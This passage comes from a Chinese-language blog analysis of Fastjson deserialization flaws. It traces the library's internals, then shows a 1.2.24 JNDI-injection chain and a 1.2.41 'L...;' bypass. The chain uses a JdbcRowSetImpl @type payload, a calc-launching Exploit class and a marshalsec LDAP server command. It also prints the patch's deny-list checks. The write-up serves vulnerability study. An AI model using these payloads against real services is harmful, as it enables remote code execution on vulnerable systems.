&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> ObjectDeserializer <span class="title function_">getDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.denyList.length; ++i) &#123; <span class="comment">// 在中间的某一步会检查类名是否处在黑名单中，在1.2.24版本之前，denyList为[&quot;java.lang.Thread&quot;]</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> <span class="built_in">this</span>.denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;parser deny : &quot;</span> + className);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>获取完对应的反序列化器后进可以进行反序列化了，跟进<code>deserialze()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBeanDeserializer</span> <span class="keyword">implements</span> <span class="title class_">ObjectDeserializer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.deserialze(parser, type, fieldName, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>上面一步会创建该类的实例<code>instance</code>然后传入到内部的<code>parseRest()</code>函数，进到更具体的<code>deserialze()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBeanDeserializer</span> <span class="keyword">implements</span> <span class="title class_">ObjectDeserializer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">parseRest</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName, Object instance, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.deserialze(parser, type, fieldName, instance, features);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这一步的<code>deserialze()</code>函数因为太多也不具体展示了，主要是处理其对象成员，然后调用其<code>set</code>函数来给实例进行赋值，主要代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBeanDeserializer</span> <span class="keyword">implements</span> <span class="title class_">ObjectDeserializer</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName, Object object, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (matchField) &#123; <span class="comment">// 是否匹配到对象成员</span></span><br><span class="line">            <span class="keyword">if</span> (!valueParsed) &#123;</span><br><span class="line">                fieldDeser.parseField(parser, object, type, fieldValues);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (object == <span class="literal">null</span>) &#123;</span><br><span class="line">                    fieldValues.put(fieldInfo.name, fieldValue);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldValue == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (fieldClass != Integer.TYPE &amp;&amp; fieldClass != Long.TYPE &amp;&amp; fieldClass != Float.TYPE &amp;&amp; fieldClass != Double.TYPE &amp;&amp; fieldClass != Boolean.TYPE) &#123;</span><br><span class="line">                        fieldDeser.setValue(object, fieldValue);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    fieldDeser.setValue(object, fieldValue); <span class="comment">// 调用setValue()函数进行赋值</span></span><br><span class="line">                &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>跟一下<code>setValue()</code>函数可以看到使用了<code>invoke()</code>调用了对应的<code>set</code>函数，发现<code>this.fieldInfo.method</code>其实在创建反序列化器的时候就已经被创建，所以我们移步回这个<code>this.config.getDeserializer(clazz)</code>函数的实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">FieldDeserializer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object object, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span> || !<span class="built_in">this</span>.fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="built_in">this</span>.fieldInfo.method; <span class="comment">// 获取对应的set函数</span></span><br><span class="line">                <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.fieldInfo.getOnly) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                            <span class="type">AtomicInteger</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicInteger)method.invoke(object);</span><br><span class="line">                            <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                                atomic.set(((AtomicInteger)value).get());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                            <span class="type">AtomicLong</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicLong)method.invoke(object);</span><br><span class="line">                            <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                                atomic.set(((AtomicLong)value).get());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                            <span class="type">AtomicBoolean</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicBoolean)method.invoke(object);</span><br><span class="line">                            <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                                atomic.set(((AtomicBoolean)value).get());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map)method.invoke(object);</span><br><span class="line">                            <span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">                                map.putAll((Map)value);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> (Collection)method.invoke(object);</span><br><span class="line">                            <span class="keyword">if</span> (collection != <span class="literal">null</span>) &#123;</span><br><span class="line">                                collection.addAll((Collection)value);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        method.invoke(object, value); <span class="comment">// 使用invoke()调用该set函数</span></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>一直跟进到下面这行代码，我们需要创建一个<code>JavaBeanDeserializer</code>的反序列化器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ObjectDeserializer <span class="title function_">getDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> &#123;</span><br><span class="line">    	...</span><br><span class="line">		derializer = <span class="built_in">this</span>.createJavaBeanDeserializer(clazz, (Type)type);</span><br><span class="line">		...</span><br></pre></td></tr></table></figure>

<p>在<code>createJavaBeanDeserializer()</code>中对传入的类建立一个<code>beanInfo</code>，这个<code>beanInfo</code>包含了一个类的全部重要属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ObjectDeserializer <span class="title function_">createJavaBeanDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">		beanInfo = JavaBeanInfo.build(clazz, type, <span class="built_in">this</span>.propertyNamingStrategy);</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>跟进<code>JavaBeanInfo.build()</code>函数的具体实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBeanInfo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> JavaBeanInfo <span class="title function_">build</span><span class="params">(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy)</span> &#123;</span><br><span class="line">        </span><br><span class="line">    	...</span><br><span class="line">            </span><br><span class="line">		Method[] methods = clazz.getMethods(); <span class="comment">// 获取该类的全部方法</span></span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// 比例类的所有方法，如果找到了以&quot;set&quot;开头的方法</span></span><br><span class="line">            <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> methodName.charAt(<span class="number">3</span>);</span><br><span class="line">            String propertyName;</span><br><span class="line">            <span class="keyword">if</span> (!Character.isUpperCase(c3) &amp;&amp; c3 &lt;= <span class="number">512</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">                    propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                    propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (methodName.length() &lt; <span class="number">5</span> || !Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">                propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>); <span class="comment">// 截取&quot;set&quot;之后的字符串并让首字母转为小写，即获取其属性名</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> TypeUtils.getField(clazz, propertyName, declaredFields);</span><br><span class="line">            <span class="keyword">if</span> (field == <span class="literal">null</span> &amp;&amp; types[<span class="number">0</span>] == Boolean.TYPE) &#123; <span class="comment">// 如果该属性不在声明成员中且为bool类型时</span></span><br><span class="line">                isFieldName = <span class="string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="number">0</span>)) + propertyName.substring(<span class="number">1</span>); <span class="comment">// 转化为对应的&quot;is&quot;方法</span></span><br><span class="line">                field = TypeUtils.getField(clazz, isFieldName, declaredFields); <span class="comment">// 检查其是否存在&quot;is&quot;方法</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">JSONField</span> <span class="variable">fieldAnnotation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">                fieldAnnotation = (JSONField)field.getAnnotation(JSONField.class);</span><br><span class="line">                <span class="keyword">if</span> (fieldAnnotation != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!fieldAnnotation.deserialize()) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ordinal = fieldAnnotation.ordinal();</span><br><span class="line">                    serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());</span><br><span class="line">                    parserFeatures = Feature.of(fieldAnnotation.parseFeatures());</span><br><span class="line">                    <span class="keyword">if</span> (fieldAnnotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                        propertyName = fieldAnnotation.name();</span><br><span class="line">                        add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)<span class="literal">null</span>)); <span class="comment">// 如果存在对应的&quot;set&quot;方法就会加入到域成员列表中</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (propertyNamingStrategy != <span class="literal">null</span>) &#123;</span><br><span class="line">                propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)<span class="literal">null</span>)); <span class="comment">// 最后把对应的属性名和&quot;set&quot;方法等相关信息加入到成员列表中</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>那么关于json字符串从反序列化开始后到对应属性的<code>set</code>方法调用的分析就到此为止</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-2-24漏洞"><a href="#1-2-24漏洞" class="headerlink" title="1.2.24漏洞"></a>1.2.24漏洞</h3><p><strong>Exploit.java</strong></p>
<blockquote>
<p>务必记得Exploit.java的编译环境要尽量与漏洞触发环境（客户端）相同</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">    	<span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// javac Explit.java</span></span><br><span class="line"><span class="comment">// python -m http.server 8888    </span></span><br></pre></td></tr></table></figure>

<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure>

<p><strong>服务器</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://localhost:<span class="number">8888</span>/#Exploit&quot; <span class="number">1389</span></span><br></pre></td></tr></table></figure>

<p><strong>分析</strong></p>
<p>反序列化调用<code>setAutoCommit()</code>函数进行赋值，期间会调用<code>connect()</code>函数</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105240210736d2a3107a8f4a9ac8a.png" alt="image-20210523021746723" style="zoom: 80%;" />

<p>跟进<code>connect()</code>函数，如果<code>dataSourceName</code>不为空就会调用<code>lookup()</code>函数造成jndi注入</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105240210be38ee1879569a57a263.png" alt="image-20210523021713896" style="zoom: 80%;" />

<p><strong>Patch</strong></p>
<p>在<code>parseObject()</code>中引入了<code>checkAutoType()</code>的黑白名单检查</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultJSONParser</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(Map object, Object fieldName)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">            typeName = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">                strValue = <span class="literal">null</span>;</span><br><span class="line">                Class clazz;</span><br><span class="line">                <span class="keyword">if</span> (object != <span class="literal">null</span> &amp;&amp; object.getClass().getName().equals(typeName)) &#123;</span><br><span class="line">                    clazz = object.getClass();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    clazz = <span class="built_in">this</span>.config.checkAutoType(typeName, (Class)<span class="literal">null</span>, lexer.getFeatures()); <span class="comment">// 检查黑名单</span></span><br><span class="line">                &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p><code>checkAutoType()</code>函数的详细代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">128</span>) &#123; <span class="comment">// 限制了小于128的长度</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">int</span> mask;</span><br><span class="line">            String accept;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="built_in">this</span>.acceptList.length; ++mask) &#123; <span class="comment">// 检查白名单</span></span><br><span class="line">                    accept = <span class="built_in">this</span>.acceptList[mask];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="built_in">this</span>.denyList.length; ++mask) &#123; <span class="comment">// 检查黑名单</span></span><br><span class="line">                    accept = <span class="built_in">this</span>.denyList[mask];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(accept) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                clazz = <span class="built_in">this</span>.deserializers.findClass(typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; <span class="comment">// 检查类是否在预期类中</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="built_in">this</span>.denyList.length; ++mask) &#123;</span><br><span class="line">                        accept = <span class="built_in">this</span>.denyList[mask];</span><br><span class="line">                        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="built_in">this</span>.acceptList.length; ++mask) &#123;</span><br><span class="line">                        accept = <span class="built_in">this</span>.acceptList[mask];</span><br><span class="line">                        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                                clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>); <span class="comment">// 在这一步进行只爱之前loadCLass()</span></span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                ...</span><br></pre></td></tr></table></figure>

<h3 id="1-2-41漏洞"><a href="#1-2-41漏洞" class="headerlink" title="1.2.41漏洞"></a>1.2.41漏洞</h3><blockquote>
<p>针对1.2.24版本漏洞补丁的绕过</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>只需在<code>@type</code>字段的首尾加多一个<code>L</code>和<code>;</code></p>
<p><strong>分析</strong></p>
<p>很粗暴的绕过方式，看过上面1.2.24版本的补丁可以知道，Fastjson会把对类名的修正（删除一些多余的描述符）放在了检查黑白名单的代码之后，这是个经典的<strong>TOCTOU漏洞</strong>，具体代码如下</p>
<p>在<code>com/alibaba/fastjson/util/TypeUtils.java</code>中的<code>loadClass()</code>方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TypeUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">                <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123; <span class="comment">// 绕过的条件</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">            &#125; </span><br><span class="line">            </span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<p>在该方法中有两处字符检查，第一处的作用是匹配以<code>&#39;[&#39;</code>开头的字符串，而第二处则是匹配以”L”开头，以”;”结尾的字符串</p>
<p><code>[LAutoTypeTest.ForTest;</code>这种类型的字符串其实是一种对函数返回值和参数的编码，名为<strong>JNI字段描述符</strong></p>
<p>其中首个字符”[“用以表示数组的层数，而第二个字符则代表数组的类型。</p>
<blockquote>
<p>这里举例说明一下JNI字段描述符的格式：</p>
<ol>
<li><p>double对应的类对象名为”[[D”</p>
</li>
<li><p>int[]对应的类对象名则为”[I”</p>
</li>
<li><p>AutoTypeTest.ForTest[]对应的类对象名则为”[LAutoTypeTest.ForTest;”</p>
</li>
</ol>
<p>而L为类描述符，”L”与”;”之间的字符串表示着该类对象的所属类（AutoTypeTest.ForTest）</p>
</blockquote>
<p><strong>Patch</strong></p>
